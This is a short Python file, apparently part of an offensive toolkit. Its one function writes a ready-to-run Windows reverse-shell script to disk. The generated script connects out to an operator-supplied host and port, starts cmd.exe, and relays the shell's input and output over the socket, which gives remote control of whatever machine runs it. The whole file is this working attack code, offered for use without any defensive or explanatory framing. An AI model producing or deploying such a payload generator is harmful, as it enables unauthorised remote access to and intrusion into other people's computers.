import platform


def py_rs(host, port, file_path):
    if platform.system() == 'Windows':
        file_path += '\\python_reverse_shell_for_windows.py'
    elif platform.system() == 'Linux':
        file_path += '/python_reverse_shell_for_windows.py'
    with open(file_path, 'w') as f:
        f.write(f"""import os, socket, subprocess, threading
        
HOST = '{str(host)}'
PORT = {port}

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
        """)
    return file_path
